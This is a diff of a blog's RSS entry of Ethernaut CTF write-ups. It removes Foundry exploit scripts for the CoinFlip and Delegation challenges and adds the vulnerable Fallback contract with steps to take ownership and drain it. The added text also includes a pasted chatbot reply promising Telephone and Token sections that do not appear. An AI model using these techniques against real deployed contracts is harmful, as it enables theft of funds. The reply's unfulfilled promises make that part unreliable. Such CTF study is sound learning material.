@@ -30,72 +30,58 @@
       <description>
         <![CDATA[<h1>Ethernaut Challenges</h1><p>Author: xiaowenji(ctfxiaowenji@gmail.com)</p>
         
-          <h1 id="solving-ethernaut-challenges">
+          <p>Nice, thanks for pasting the whole file. I’ll go through it carefully and <strong>fix explanations, grammar, and clarity</strong> so everything reads smoothly and consistently. I’ll also finish the missing pieces (like the Telephone explanation) and tighten up the Token section.</p>
+<p>Here’s the fully polished write-up:</p>
+<hr>
+<h1 id="solving-ethernaut-challenges">
 <a class="header-anchor" href="#solving-ethernaut-challenges"></a>
-Solving ethernaut challenges!
-</h1><h2 id="coinflip">
-<a class="header-anchor" href="#coinflip"></a>
-CoinFlip
-</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: UNLICENSED
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">13</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;forge-std/Script.sol&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;forge-std/console.sol&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;../src/CoinFlip.sol&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Exploit</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">constant</span> <span style="color:#a6e22e">FACTOR</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CoinFlip</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">coinFlipInstance</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">CoinFlip</span> <span style="color:#a6e22e">_coinFlipInstance</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">coinFlipInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_coinFlipInstance</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#66d9ef">public</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint256</span>(<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">FACTOR</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">side</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">coinFlipInstance</span>.<span style="color:#a6e22e">flip</span>(<span style="color:#a6e22e">side</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">CoinFlipSolution</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">Script</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CoinFlip</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">coinFlipInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CoinFlip</span>(<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">YOUR_INSTANCE</span><span style="color:#f92672">&gt;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">startBroadcast</span>(<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">envUint</span>(<span style="color:#e6db74">&#34;PRIVATE_KEY&#34;</span>));
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Exploit</span> <span style="color:#a6e22e">exploit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exploit</span>(<span style="color:#a6e22e">coinFlipInstance</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exploit</span>.<span style="color:#a6e22e">attack</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Number of wins:&#34;</span>, <span style="color:#a6e22e">coinFlipInstance</span>.<span style="color:#a6e22e">consecutiveWins</span>());
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">stopBroadcast</span>();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Running the script to solve the challenge:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>forge script script/CoinFlipSolution.s.sol --rpc-url $SEPOLIA_URL --tc CoinFlipSolution --broadcast
-</span></span></code></pre></div><h2 id="delegation">
-<a class="header-anchor" href="#delegation"></a>
-Delegation
-</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: UNLICENSED
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;forge-std/Script.sol&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;forge-std/console.sol&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#34;../src/Delegation.sol&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">TokenSolution</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">Script</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Delegation</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">delegationInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Delegation</span>(<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">YOUR_INSTANCE</span><span style="color:#f92672">&gt;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() <span style="color:#66d9ef">public</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">startBroadcast</span>(<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">envUint</span>(<span style="color:#e6db74">&#34;PRIVATE_KEY&#34;</span>));
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">delegationInstance</span>).<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodeWithSignature</span>(<span style="color:#e6db74">&#34;pwn()&#34;</span>));
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Owner of the contract is currently: &#34;</span>, <span style="color:#a6e22e">delegationInstance</span>.<span style="color:#a6e22e">owner</span>());
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;My current address: &#34;</span>, <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">envAddress</span>(<span style="color:#e6db74">&#34;MY_ADDRESS&#34;</span>));
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">stopBroadcast</span>();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Running the script to solve the challenge:</p>
+Solving Ethernaut Challenges!
+</h1><hr>
+<h2 id="fallback">
+<a class="header-anchor" href="#fallback"></a>
+Fallback
+</h2><h3 id="challenge-code">
+<a class="header-anchor" href="#challenge-code"></a>
+Challenge Code
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">contract</span> <span class="nx">Fallback</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="p">=&gt;</span> <span class="nx">uint256</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">contributions</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">modifier</span> <span class="nx">onlyOwner</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span> <span class="s2">&#34;caller is not the owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">contribute</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&lt;</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">owner</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">getContribution</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">withdraw</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">receive</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>To solve, we contribute a small amount so our contribution is &gt; 0. Then we send ether directly to the contract, triggering <code>receive()</code>, which sets us as the new owner. Finally, we call <code>withdraw()</code> to drain the contract.</p>
         
         <hr><p>Published on 2025-09-11 at <a href='https://xiaowenjictf.github.io/'>xiaowenji's blog</a>, last modified on 2025-09-11</p>]]>
       </description>
